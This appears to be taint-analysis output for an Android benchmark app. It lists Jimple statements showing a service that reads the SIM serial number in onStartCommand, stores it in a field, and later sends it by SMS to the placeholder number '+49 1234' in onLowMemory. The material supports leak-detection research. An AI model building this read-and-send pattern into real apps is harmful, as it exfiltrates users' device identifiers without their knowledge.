,method,stmtLineNumber,stmt
0,"<de.ecspride.MainService: int onStartCommand(android.content.Intent,int,int)>",-1,$r4 = virtualinvoke r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>()
1,"<de.ecspride.MainService: int onStartCommand(android.content.Intent,int,int)>",-1,r0.<de.ecspride.MainService: java.lang.String secret> = $r4
2,"<de.ecspride.MainService: int onStartCommand(android.content.Intent,int,int)>",-1,return 0
3,<dummyMainClass: de.ecspride.MainService dummyMainMethod_de_ecspride_MainService(android.content.Intent)>,-1,virtualinvoke $r0.<de.ecspride.MainService: void onLowMemory()>()
4,<de.ecspride.MainService: void onLowMemory()>,-1,$r1 = r0.<de.ecspride.MainService: java.lang.String secret>
5,<de.ecspride.MainService: void onLowMemory()>,-1,"virtualinvoke $r2.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>(""+49 1234"", null, $r1, null, null)"
